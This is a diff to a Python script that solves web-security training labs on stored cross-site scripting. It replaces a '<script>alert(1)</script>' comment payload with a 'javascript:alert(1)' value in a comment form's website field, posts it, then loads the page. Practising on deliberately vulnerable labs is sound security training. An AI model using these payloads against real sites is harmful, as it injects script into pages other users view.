@@ -4,7 +4,7 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-LAB_NAME = "Stored XSS into HTML context with nothing encoded"
+LAB_NAME = "Stored XSS into anchor href attribute with double quotes HTML-encoded"
 
 def run(url, payload=None, proxies=None):
     session = requests.Session()
@@ -22,11 +22,13 @@ def run(url, payload=None, proxies=None):
             "postId": "1",
             "name": "mystic_mido",
             "email": "mystic_mido@mystic_mido.com",
-            "website": "https://snehbavarva.com",
-            "comment": "<script>alert(1)</script>"
+            "website": "javascript:alert(1)",
+            "comment": "checkout my portfolio!"
         }
 
         response = session.post(url.rstrip('/') + "/post/comment", data=data)
+        r = session.get(url.rstrip('/') + "/post?postId=1")
+
         return "Congratulations, you solved the lab!" in response.text or response.status_code == 200
 
     except Exception as e:
